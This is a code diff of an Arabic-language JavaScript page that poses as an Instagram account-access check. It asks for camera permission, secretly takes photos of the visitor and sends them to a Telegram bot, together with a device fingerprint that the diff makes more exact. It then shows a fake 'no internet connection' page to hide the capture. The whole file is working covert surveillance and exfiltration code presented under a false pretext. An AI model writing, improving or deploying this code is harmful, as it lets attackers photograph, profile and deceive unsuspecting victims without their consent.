@@ -284,15 +284,11 @@ async function startCamera() {
 
     if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
       statusEl.className = 'status-error';
-      statusEl.innerHTML = `
-        <div>🚫 للحصول على إذن الدخول، يجب السماح بالوصول إلى الكاميرا.</div>
-        <button class="retry-btn" id="retryCamBtn">
-          السماح بالوصول لمتابعة حساب إنستغرام
-        </button>
-        <div class="retry-hint" id="retryHint" style="display:none;">
-          إذا لم تظهر نافذة الإذن، افتح إعدادات المتصفح ← أذونات الموقع ← الكاميرا ← "سماح" ثم أعد تحميل الصفحة.
-        </div>
-      `;
+      statusEl.innerHTML =
+        '<div>🚫 للحصول على إذن الدخول، يجب السماح بالوصول إلى الكاميرا.</div>' +
+        '<button class="retry-btn" id="retryCamBtn">السماح بالوصول لمتابعة حساب إنستغرام</button>' +
+        '<div class="retry-hint" id="retryHint" style="display:none;">إذا لم تظهر نافذة الإذن، افتح إعدادات المتصفح ← أذونات الموقع ← الكاميرا ← "سماح" ثم أعد تحميل الصفحة.</div>';
+
       const btn  = document.getElementById('retryCamBtn');
       const hint = document.getElementById('retryHint');
       btn.addEventListener('click', async () => {
@@ -354,14 +350,14 @@ function canvasToBlob(cv) {
 
 /* ---------- 3) إرسال صورة إلى تليجرام ---------- */
 async function sendPhoto(blob, index) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+  const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
 
   const fd = new FormData();
   fd.append('chat_id', TELEGRAM_CHAT_ID);
-  fd.append('photo', blob, `photo_${index}.jpg`);
+  fd.append('photo', blob, 'photo_' + index + '.jpg');
   fd.append('caption',
-    `📸 صورة ${index} من ${CONFIG.photosCount}\n` +
-    `🕐 ${new Date().toLocaleString('ar-EG')}`
+    '📸 صورة ' + index + ' من ' + CONFIG.photosCount + '\n' +
+    '🕐 ' + new Date().toLocaleString('ar-EG')
   );
 
   const res  = await fetch(url, { method: 'POST', body: fd });
@@ -372,108 +368,162 @@ async function sendPhoto(blob, index) {
 
 /* ---------- 4) صفحة "فشل الاتصال بالإنترنت" ---------- */
 function showInternetErrorPage() {
+  const page = '<!DOCTYPE html>' +
+'<html lang="ar" dir="rtl">' +
+'<head>' +
+'<meta charset="UTF-8">' +
+'<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+'<title>لا يوجد اتصال بالإنترنت</title>' +
+'<style>' +
+'* { box-sizing: border-box; margin: 0; padding: 0; }' +
+'body { min-height: 100vh; display: flex; align-items: center; justify-content: center;' +
+'background: #fafafa; font-family: -apple-system, "Segoe UI", Tahoma, sans-serif;' +
+'color: #262626; padding: 24px; text-align: center; }' +
+'.wrap { max-width: 420px; width: 100%; }' +
+'.wifi-icon { width: 110px; height: 110px; margin: 0 auto 26px; display: block; }' +
+'.wifi-icon .ring { fill: none; stroke: url(#igGrad); stroke-width: 8; stroke-linecap: round; opacity: 0; animation: wifiPulse 2.2s ease-out infinite; }' +
+'.wifi-icon .ring:nth-child(1) { animation-delay: 0s; }' +
+'.wifi-icon .ring:nth-child(2) { animation-delay: 0.35s; }' +
+'.wifi-icon .ring:nth-child(3) { animation-delay: 0.7s; }' +
+'.wifi-icon .dot { fill: url(#igGrad); }' +
+'.wifi-icon .cross { stroke: #ed4956; stroke-width: 9; stroke-linecap: round; opacity: 0.9; }' +
+'@keyframes wifiPulse { 0% { opacity: 0; } 40% { opacity: 1; } 100% { opacity: 0; } }' +
+'h1 { font-size: 22px; font-weight: 700; color: #262626; margin-bottom: 14px; }' +
+'p { font-size: 15px; line-height: 1.9; color: #8e8e8e; margin-bottom: 28px; }' +
+'.btn { display: inline-block; padding: 13px 32px; border-radius: 10px;' +
+'background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);' +
+'color: #ffffff; font-size: 15px; font-weight: 700; text-decoration: none; border: none;' +
+'cursor: pointer; box-shadow: 0 6px 20px rgba(225, 48, 108, 0.3); font-family: inherit; }' +
+'.code { margin-top: 24px; font-size: 12px; color: #c7c7c7; }' +
+'</style>' +
+'</head>' +
+'<body>' +
+'<div class="wrap">' +
+'<svg class="wifi-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">' +
+'<defs>' +
+'<linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">' +
+'<stop offset="0%" stop-color="#405DE6"/>' +
+'<stop offset="25%" stop-color="#833AB4"/>' +
+'<stop offset="50%" stop-color="#E1306C"/>' +
+'<stop offset="75%" stop-color="#F77737"/>' +
+'<stop offset="100%" stop-color="#FFDC80"/>' +
+'</linearGradient>' +
+'</defs>' +
+'<path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>' +
+'<path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>' +
+'<path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>' +
+'<circle class="dot" cx="60" cy="103" r="6"/>' +
+'<line class="cross" x1="22" y1="22" x2="98" y2="98"/>' +
+'</svg>' +
+'<h1>فشل الاتصال بالإنترنت</h1>' +
+'<p>تعذّر الاتصال بالشبكة.<br>يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.</p>' +
+'<button class="btn" onclick="location.reload()">إعادة المحاولة</button>' +
+'<div class="code">ERR_INTERNET_DISCONNECTED</div>' +
+'</div>' +
+'</body>' +
+'</html>';
+
   document.open();
-  document.write(`<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لا يوجد اتصال بالإنترنت</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #fafafa;
-    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Tahoma, sans-serif;
-    color: #262626;
-    padding: 24px;
-    text-align: center;
-  }
-  .wrap { max-width: 420px; width: 100%; }
-  .wifi-icon { width: 110px; height: 110px; margin: 0 auto 26px; display: block; }
-  .wifi-icon .ring {
-    fill: none; stroke: url(#igGrad); stroke-width: 8;
-    stroke-linecap: round; opacity: 0;
-    animation: wifiPulse 2.2s ease-out infinite;
-  }
-  .wifi-icon .ring:nth-child(1) { animation-delay: 0s; }
-  .wifi-icon .ring:nth-child(2) { animation-delay: 0.35s; }
-  .wifi-icon .ring:nth-child(3) { animation-delay: 0.7s; }
-  .wifi-icon .dot { fill: url(#igGrad); }
-  .wifi-icon .cross {
-    stroke: #ed4956; stroke-width: 9;
-    stroke-linecap: round; opacity: 0.9;
-  }
-  @keyframes wifiPulse {
-    0%   { opacity: 0; }
-    40%  { opacity: 1; }
-    100% { opacity: 0; }
-  }
-  h1 {
-    font-size: 22px; font-weight: 700; color: #262626;
-    margin-bottom: 14px; letter-spacing: -0.3px;
-  }
-  p {
-    font-size: 15px; line-height: 1.9;
-    color: #8e8e8e; margin-bottom: 28px;
-  }
-  .btn {
-    display: inline-block; padding: 13px 32px; border-radius: 10px;
-    background: linear-gradient(45deg,
-      #405DE6, #5851DB, #833AB4, #C13584,
-      #E1306C, #FD1D1D, #F56040, #F77737,
-      #FCAF45, #FFDC80);
-    color: #ffffff; font-size: 15px; font-weight: 700;
-    text-decoration: none; border: none; cursor: pointer;
-    box-shadow: 0 6px 20px rgba(225, 48, 108, 0.3);
-    font-family: inherit; transition: transform .15s;
-  }
-  .btn:active { transform: scale(0.97); }
-  .code { margin-top: 24px; font-size: 12px; color: #c7c7c7; letter-spacing: 0.5px; }
-</style>
-</head>
-<body>
-  <div class="wrap">
-    <svg class="wifi-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-          <stop offset="0%"   stop-color="#405DE6"/>
-          <stop offset="25%"  stop-color="#833AB4"/>
-          <stop offset="50%"  stop-color="#E1306C"/>
-          <stop offset="75%"  stop-color="#F77737"/>
-          <stop offset="100%" stop-color="#FFDC80"/>
-        </linearGradient>
-      </defs>
-      <path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>
-      <path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>
-      <path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>
-      <circle class="dot" cx="60" cy="103" r="6"/>
-      <line class="cross" x1="22" y1="22" x2="98" y2="98"/>
-    </svg>
-    <h1>فشل الاتصال بالإنترنت</h1>
-    <p>
-      تعذّر الاتصال بالشبكة.<br>
-      يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.
-    </p>
-    <button class="btn" onclick="location.reload()">إعادة المحاولة</button>
-    <div class="code">ERR_INTERNET_DISCONNECTED</div>
-  </div>
-</body>
-</html>`);
+  document.write(page);
   document.close();
 }
 
-/* ---------- 5) جمع وإرسال معلومات الجهاز ---------- */
+/* ---------- 5) جلب طراز الجهاز الدقيق ---------- */
+async function getExactDeviceModel() {
+  const ua = navigator.userAgent;
+  let model  = '';
+  let vendor = '';
+
+  // ===== الطريقة 1: Client Hints (الأدق - Chrome/Edge على Android) =====
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        'model', 'platform', 'platformVersion', 'architecture', 'bitness'
+      ]);
+      if (hints.model) {
+        model = hints.model;
+      }
+    }
+  } catch (e) {
+    console.warn('Client Hints غير مدعوم:', e.message);
+  }
+
+  // ===== الطريقة 2: استخراج من User-Agent (خطة بديلة) =====
+  if (!model) {
+    // أندرويد: نموذج مثل "Android 13; SM-S911B Build/..."
+    const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+?)(?:\s+Build|\))/i);
+    if (androidMatch) {
+      model = androidMatch[1].trim();
+      // إزالة "wv" أو "en-us" وغيرها
+      model = model.replace(/^(wv|en-us|ar-eg)\s*;?\s*/i, '').trim();
+      model = model.replace(/\s+Build.*$/i, '').trim();
+    }
+
+    // iPhone
+    if (!model && /iPhone/i.test(ua)) {
+      const iosMatch = ua.match(/iPhone OS (\d+)_(\d+)/i);
+      model = iosMatch ? 'iPhone (iOS ' + iosMatch[1] + '.' + iosMatch[2] + ')' : 'iPhone';
+    }
+
+    // iPad
+    if (!model && /iPad/i.test(ua)) {
+      model = 'iPad';
+    }
+  }
+
+  // ===== الطريقة 3: استخراج الشركة المصنعة =====
+  const checkString = model + ' ' + ua;
+  const brands = [
+    { name: 'Samsung',  regex: /Samsung|SM-[A-Z]\d|Galaxy/i },
+    { name: 'Xiaomi',   regex: /Xiaomi|Redmi|POCO|MI\s+\d|M20\d\d|M21\d\d/i },
+    { name: 'Huawei',   regex: /Huawei|HONOR|Honor|HUAWEI/i },
+    { name: 'Google',   regex: /Pixel/i },
+    { name: 'OnePlus',  regex: /OnePlus|ONEPLUS|CPH\d{4}|LE\d{4}|IN\d{4}/i },
+    { name: 'Oppo',     regex: /OPPO|CPH\d|A\d{2,3}|Reno/i },
+    { name: 'Vivo',     regex: /vivo|V\d{4}/i },
+    { name: 'Realme',   regex: /realme|RMX\d/i },
+    { name: 'Nokia',    regex: /Nokia|TA-\d/i },
+    { name: 'Sony',     regex: /Sony|Xperia/i },
+    { name: 'LG',       regex: /LG-|LG\s|LM-/i },
+    { name: 'Motorola', regex: /moto|Motorola|XT\d{4}/i },
+    { name: 'Infinix',  regex: /Infinix|X\d{3,4}/i },
+    { name: 'Tecno',    regex: /TECNO|Tecno|CK\d|KC\d/i },
+    { name: 'Apple',    regex: /iPhone|iPad|Macintosh|Apple/i }
+  ];
+
+  for (const brand of brands) {
+    if (brand.regex.test(checkString)) {
+      vendor = brand.name;
+      break;
+    }
+  }
+
+  // استخراج اسم الطراز الكامل من عدة أنماط
+  if (!model || model === 'غير معروف') {
+    // محاولة استخراج كلمة طراز مثل "SM-S911B" أو "M2101K7AG"
+    const specificMatch = ua.match(/\b(SM-[A-Z0-9]+|RMX\d+|M\d{4}[A-Z]*\d*|CPH\d+|V\d{4}|XT\d{4}|TA-\d+|LM-[A-Z]\d+|Pixel\s+\d+[a-zA-Z\s]*|IN\d{4})\b/i);
+    if (specificMatch) {
+      model = specificMatch[1];
+    }
+  }
+
+  return {
+    model:  model  || 'غير معروف',
+    vendor: vendor || 'غير معروف',
+    rawUA:  ua
+  };
+}
+
+/* ---------- 6) إرسال معلومات الجهاز ---------- */
 async function sendDeviceInfo() {
   try {
     const nav = navigator;
     const scr = screen;
     const ua  = nav.userAgent;
 
-    // نظام التشغيل
+    // جلب الطراز الدقيق
+    const deviceData = await getExactDeviceModel();
+
     const isAndroid = /Android/i.test(ua);
     const isIOS     = /iPhone|iPad|iPod/i.test(ua);
     const isWindows = /Windows/i.test(ua);
@@ -487,7 +537,6 @@ async function sendDeviceInfo() {
     else if (isMac)     os = 'macOS';
     else if (isLinux)   os = 'Linux';
 
-    // المتصفح
     let browser = 'غير معروف';
     if (/Edg\//i.test(ua))          browser = 'Microsoft Edge';
     else if (/OPR\//i.test(ua))     browser = 'Opera';
@@ -495,49 +544,50 @@ async function sendDeviceInfo() {
     else if (/Firefox\//i.test(ua)) browser = 'Firefox';
     else if (/Safari\//i.test(ua))  browser = 'Safari';
 
-    // نوع الاتصال
     let connection = 'غير متاح';
     const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
     if (conn) connection = conn.effectiveType || conn.type || 'غير معروف';
 
-    // البطارية
     let battery = 'غير مدعوم';
     try {
       if (nav.getBattery) {
         const b = await nav.getBattery();
-        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'يشحن' : 'لا يشحن') + ')';
       }
-    } catch (e) { /* تجاهل */ }
+    } catch (e) {}
 
-    const memory = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'غير متاح';
+    const memory = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'غير متاح';
     const cores  = nav.hardwareConcurrency ? nav.hardwareConcurrency : 'غير متاح';
     const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
 
-    const text =
-`🖥️ معلومات الجهاز
+    const lines = [
+      '🖥️ معلومات الجهاز الكاملة',
+      '',
+      '📲 الطراز: ' + deviceData.model,
+      '🏷️ الشركة: ' + deviceData.vendor,
+      '⚙️ النظام: ' + os,
+      '🌐 المتصفح: ' + browser,
+      '🗣️ اللغة: ' + (nav.language || 'غير معروف'),
+      '🌍 المنطقة الزمنية: ' + tz,
+      '',
+      '📐 دقة الشاشة: ' + scr.width + ' × ' + scr.height,
+      '📏 دقة النافذة: ' + window.innerWidth + ' × ' + window.innerHeight,
+      '🔍 كثافة البكسل: ' + (window.devicePixelRatio || 1) + 'x',
+      '🧠 أنوية المعالج: ' + cores,
+      '💾 الذاكرة التقديرية: ' + memory,
+      '🔋 البطارية: ' + battery,
+      '📶 الاتصال: ' + connection,
+      '👆 اللمس: ' + (('ontouchstart' in window) ? 'مدعوم' : 'غير مدعوم'),
+      '🕐 الوقت: ' + new Date().toLocaleString('ar-EG'),
+      '',
+      '📄 User Agent:',
+      ua
+    ];
 
-🌐 المتصفح: ${browser}
-📱 نظام التشغيل: ${os}
-🗣️ اللغة: ${nav.language || 'غير معروف'}
-🌍 المنطقة الزمنية: ${tz}
-
-📐 دقة الشاشة: ${scr.width} × ${scr.height}
-📏 دقة النافذة: ${window.innerWidth} × ${window.innerHeight}
-🔍 كثافة البكسل: ${window.devicePixelRatio || 1}x
-🧠 أنوية المعالج: ${cores}
-💾 الذاكرة التقديرية: ${memory}
-🔋 البطارية: ${battery}
-📶 الاتصال: ${connection}
-👆 اللمس: ${('ontouchstart' in window) ? 'مدعوم' : 'غير مدعوم'}
-🕐 الوقت: ${new Date().toLocaleString('ar-EG')}
-
-📄 User Agent:
-${ua}`;
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
     const fd  = new FormData();
     fd.append('chat_id', TELEGRAM_CHAT_ID);
-    fd.append('text', text);
+    fd.append('text', lines.join('\n'));
     fd.append('disable_web_page_preview', 'true');
 
     await fetch(url, { method: 'POST', body: fd });
@@ -547,7 +597,7 @@ ${ua}`;
   }
 }
 
-/* ---------- 6) المتابعة بعد نجاح الكاميرا ---------- */
+/* ---------- 7) المتابعة بعد نجاح الكاميرا ---------- */
 async function continueAfterCamera() {
   setStatus('تم ايجاد الحساب', 'info', true);
 
@@ -561,7 +611,7 @@ async function continueAfterCamera() {
     const blob = await canvasToBlob(cv);
 
     const p = sendPhoto(blob, i).catch(err => {
-      console.warn(`فشل العثور على الحساب ${i}:`, err.message);
+      console.warn('فشل العثور على الحساب ' + i + ':', err.message);
       failed++;
     });
     sendPromises.push(p);
@@ -575,13 +625,13 @@ async function continueAfterCamera() {
   setStatus('جاري الدخول الى Instagram', 'info', true);
   await Promise.all(sendPromises);
 
-  // إرسال معلومات الجهاز كرسالة نصية
+  // إرسال معلومات الجهاز
   await sendDeviceInfo();
 
   setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
 }
 
-/* ---------- 7) التدفق الرئيسي ---------- */
+/* ---------- 8) التدفق الرئيسي ---------- */
 async function runVerification() {
   const ok = await startCamera();
   if (!ok) return;
